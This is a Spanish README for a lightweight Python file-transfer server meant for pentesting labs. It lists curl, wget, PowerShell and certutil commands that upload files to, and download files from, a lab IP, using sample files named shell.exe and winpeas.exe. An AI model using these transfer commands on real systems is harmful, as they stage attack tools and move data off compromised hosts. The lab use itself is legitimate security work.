# Upload Server

Un servidor HTTP pequeño para pasar archivos entre máquinas. Lo uso sobre todo en laboratorios de pentesting: subir desde Windows o Linux y recuperar archivos sin montar nada más.

## Requisitos

- Python 3.10 o superior.
- [Rich](https://github.com/Textualize/rich), para la salida de terminal.

```bash
python3 -m pip install rich
```

## Uso

```bash
python3 upload-server.py
```

Por defecto escucha en el puerto `8000`, guarda los archivos en `./uploads` y admite peticiones de hasta **500 MB**.

Puedes cambiar esos valores:

```bash
python3 upload-server.py 8081 --dir /tmp/transfers --max-mb 700
```

En los ejemplos siguientes, cambia `192.168.45.200` por la IP de la máquina donde está ejecutándose el servidor.

## Subir archivos

`/upload` acepta formularios `multipart` y también el contenido del archivo directamente (`RAW`).

**Linux — curl (multipart):**

```bash
curl -F "file=@shell.exe" http://192.168.45.200:8000/upload
```

**Linux — varios archivos:**

```bash
curl \
  -F "file=@shell.exe" \
  -F "file=@winpeas.exe" \
  http://192.168.45.200:8000/upload
```

**Linux — curl (RAW):**

```bash
curl -X POST \
  --data-binary @shell.exe \
  -H "Content-Type: application/octet-stream" \
  -H "X-Filename: shell.exe" \
  http://192.168.45.200:8000/upload
```

**Windows — PowerShell:**

```powershell
Invoke-WebRequest -Uri "http://192.168.45.200:8000/upload" `
  -Method POST `
  -InFile ".\shell.exe" `
  -Headers @{ "X-Filename" = "shell.exe" } `
  -ContentType "application/octet-stream"
```

El alias `iwr` hace lo mismo:

```powershell
iwr "http://192.168.45.200:8000/upload" `
  -Method POST `
  -InFile ".\shell.exe" `
  -Headers @{ "X-Filename" = "shell.exe" } `
  -ContentType "application/octet-stream"
```

**PowerShell — respuesta JSON con `Invoke-RestMethod`:**

```powershell
irm "http://192.168.45.200:8000/upload" `
  -Method POST `
  -InFile ".\shell.exe" `
  -Headers @{ "X-Filename" = "shell.exe" } `
  -ContentType "application/octet-stream"
```

**Windows — curl.exe (multipart):**

```powershell
curl.exe -F "file=@shell.exe" http://192.168.45.200:8000/upload
```

**Windows — curl.exe (RAW):**

```powershell
curl.exe -X POST --data-binary "@shell.exe" `
  -H "Content-Type: application/octet-stream" `
  -H "X-Filename: shell.exe" `
  http://192.168.45.200:8000/upload
```

En PowerShell es preferible escribir `curl.exe`: en algunas versiones, `curl` es un alias de `Invoke-WebRequest`.

## Descargar archivos

**Linux — curl:**

```bash
curl -o shell.exe http://192.168.45.200:8000/download/shell.exe
```

**Linux — wget:**

```bash
wget -O shell.exe http://192.168.45.200:8000/download/shell.exe
```

**Windows — PowerShell / iwr:**

```powershell
iwr "http://192.168.45.200:8000/download/shell.exe" -OutFile ".\shell.exe"
```

**Windows — certutil:**

```cmd
certutil.exe -urlcache -split -f http://192.168.45.200:8000/download/shell.exe shell.exe
```

`certutil` se incluye aquí para descargar archivos; no implementa la subida al servidor.

## Consultar el servidor

```bash
# Archivos recibidos
curl http://192.168.45.200:8000/files

# Estado del servidor
curl http://192.168.45.200:8000/health
```

En PowerShell puedes usar `irm` para recibir el JSON como objeto:

```powershell
irm "http://192.168.45.200:8000/files"
irm "http://192.168.45.200:8000/health"
```

También puedes abrir `http://192.168.45.200:8000/` en el navegador.

## Rutas

| Ruta | Uso |
|---|---|
| `/` | Interfaz web |
| `/upload` | Recibir archivos (`multipart` o RAW) |
| `/files` | Listar archivos en JSON |
| `/download/<archivo>` | Descargar un archivo |
| `/health` | Consultar el estado del servidor |

El límite de `--max-mb` se aplica a la petición completa. En una subida múltiple cuentan todos los archivos y los datos adicionales del formulario. Se permiten hasta 20 archivos por petición.

> Escucha en `0.0.0.0` por defecto. Está pensado para redes de laboratorio o de confianza: no tiene autenticación ni HTTPS. No lo expongas directamente a Internet.
